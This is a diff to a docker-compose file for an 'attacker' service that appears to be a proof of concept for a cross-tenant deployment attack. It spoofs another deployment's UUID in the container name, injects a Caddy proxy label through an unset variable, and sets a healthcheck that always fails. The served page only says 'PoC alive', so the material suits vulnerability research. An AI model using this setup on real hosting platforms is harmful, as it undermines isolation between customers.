@@ -1,15 +1,15 @@
 services:
   attacker:
     image: python:3-alpine
-    command: ["sh", "-c", "echo 'PoC alive | container_name=111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake | label=${A}=caddy' > /tmp/index.html && cd /tmp && python3 -m http.server 8080"]
-    container_name: 111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc
+    command: ["sh", "-c", "echo 'PoC alive | container_name=db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy | label=${A}=caddy' > /tmp/index.html && cd /tmp && python3 -m http.server 8080"]
+    container_name: db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy
     ports:
       - "8080:8080"
     labels:
       - "${A}=caddy"
     healthcheck:
       test: ["CMD-SHELL", "exit 1"]
-      interval: 30s
+      interval: 10s
       timeout: 5s
-      retries: 3
-      start_period: 300s
+      retries: 2
+      start_period: 10s
